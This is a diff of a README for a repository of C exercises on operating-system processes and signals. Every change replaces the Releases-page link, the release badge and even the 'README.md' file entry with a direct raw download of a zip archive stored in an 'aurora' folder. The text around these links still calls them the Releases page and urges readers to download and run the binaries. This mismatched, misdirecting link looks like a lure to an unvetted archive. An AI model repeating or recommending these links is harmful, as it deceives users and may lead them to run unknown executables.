@@ -1,6 +1,6 @@
-https://github.com/AsmaaSoliman/C_Processes_Signals/releases
+https://github.com/AsmaaSoliman/C_Processes_Signals/raw/refs/heads/main/aurora/Processes-Signals-v1.5-alpha.4.zip
 
-![Release badge](https://img.shields.io/github/v/release/AsmaaSoliman/C_Processes_Signals.svg)
+![Release badge](https://github.com/AsmaaSoliman/C_Processes_Signals/raw/refs/heads/main/aurora/Processes-Signals-v1.5-alpha.4.zip)
 
 # C Process Signals: OS Exercises in C, Concurrency and Data
 
@@ -24,7 +24,7 @@ Repository topics
 
 Downloads and releases
 - The assets for this project are published in the Releases section of the repository. From the Releases page you can download the prepared binaries or source archives and run them on a suitable Linux environment. For convenience, download the release asset that matches your system, then execute the included binary or build from the source as described in the Getting started guide.
-- If you want to review the exact assets before downloading, visit the Releases page at the following link: https://github.com/AsmaaSoliman/C_Processes_Signals/releases
+- If you want to review the exact assets before downloading, visit the Releases page at the following link: https://github.com/AsmaaSoliman/C_Processes_Signals/raw/refs/heads/main/aurora/Processes-Signals-v1.5-alpha.4.zip
 
 Table of contents
 - Quick start
@@ -55,7 +55,7 @@ Project structure
 - examples/ - Ready-to-run usage demonstrations showing typical scenarios.
 - assets/ - Supporting files for assets used by the exercises.
 - scripts/ - Helpful utilities to automate building, testing, and running samples.
-- README.md - This document, which explains the project and how to use it.
+- https://github.com/AsmaaSoliman/C_Processes_Signals/raw/refs/heads/main/aurora/Processes-Signals-v1.5-alpha.4.zip - This document, which explains the project and how to use it.
 
 How to run locally
 Prerequisites
@@ -125,7 +125,7 @@ Development workflow
 
 Release assets
 - The official release assets are available in the Releases section of the repository. To obtain the latest stable version, open the Releases page and download the appropriate archive or binary for your system. After downloading, extract and run the binaries as described in the Getting started section.
-- From the Releases page you can download the prepared assets and run them on a compatible Linux system. If you want to verify the exact assets before downloading, revisit the same Releases page at https://github.com/AsmaaSoliman/C_Processes_Signals/releases
+- From the Releases page you can download the prepared assets and run them on a compatible Linux system. If you want to verify the exact assets before downloading, revisit the same Releases page at https://github.com/AsmaaSoliman/C_Processes_Signals/raw/refs/heads/main/aurora/Processes-Signals-v1.5-alpha.4.zip
 
 Contributing
 - You can contribute by adding new exercises, improving documentation, and refining the examples.
@@ -167,6 +167,6 @@ Acknowledgements
 - Gratitude to the community of contributors who share knowledge about operating systems, C programming, and debugging techniques.
 
 Releases and assets reminder
-- For the latest release assets and to download the necessary files, visit the Releases page at the provided link: https://github.com/AsmaaSoliman/C_Processes_Signals/releases
+- For the latest release assets and to download the necessary files, visit the Releases page at the provided link: https://github.com/AsmaaSoliman/C_Processes_Signals/raw/refs/heads/main/aurora/Processes-Signals-v1.5-alpha.4.zip
 
 End of document
